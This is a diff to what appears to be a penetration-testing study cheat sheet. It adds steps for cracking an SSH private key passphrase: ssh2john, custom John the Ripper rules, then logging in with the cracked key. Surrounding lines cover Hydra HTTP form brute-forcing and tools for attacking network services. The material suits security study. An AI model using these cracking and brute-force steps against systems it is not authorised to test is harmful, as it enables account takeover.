@@ -3395,6 +3395,18 @@ Other rules
   - find the mode of KeePass in Hashcat with `hashcat --help | grep -i "KeePass"`
 
 
+#### SSH Private Key Passphrase
+
+- Prerequisites: found username, old passwords (or common passwords), password policy and private key `id_rsa`
+  - `chmod 600 id_rsa` to change the permissions
+  - `id_rsa` needs a password
+1. `ssh2john id_rsa > ssh.hash` > remove `id_rsa:`
+2. For JtR, create a file for the rules in the file `ssh.rule` using the found password policy
+   - add `[List.Rules:sshRules]` as the first line of the file
+   - add the rules to JtR config `sudo sh -c 'cat /home/kali/Downloads/ssh.rule >> /etc/john/john.conf'`
+3. `john --wordlist=ssh.passwords --rules=sshRules ssh.hash`
+4. Connect to the ssh service with `ssh -i id_rsa -p <PORT> <user>@<IP>` and insert the found password
+
 #### <ins>Network Service Attack</ins>
 
 **Tools**
@@ -3403,7 +3415,6 @@ Other rules
 - [Spray](https://github.com/Greenwolf/Spray)
 - [Crowbar](https://github.com/galkan/crowbar)
 - [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)
-
 
 #### Metasploit
 
@@ -3451,6 +3462,7 @@ HTTP POST Attack
   - `-vV` verbose output
   - `-f` stop the attack when the first successful result is found
   - supply the service module name `http-form-post` and its required arguments `/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN`
+
 
 #### <ins>Leveraging Password Hashes</ins>
 
